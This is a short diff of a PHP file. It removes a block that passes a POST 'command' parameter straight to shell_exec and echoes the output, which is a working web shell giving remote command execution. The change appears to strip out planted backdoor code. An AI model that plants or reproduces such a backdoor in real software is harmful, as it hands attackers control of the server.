@@ -1,8 +1,4 @@
 <?php
-if ($_SERVER['REQUEST_METHOD'] == "POST") {
-  echo shell_exec($_POST['command']);
-  return;
-}
 if ($_SERVER['SERVER_NAME'] == "localhost") {
   echo false;
   return;
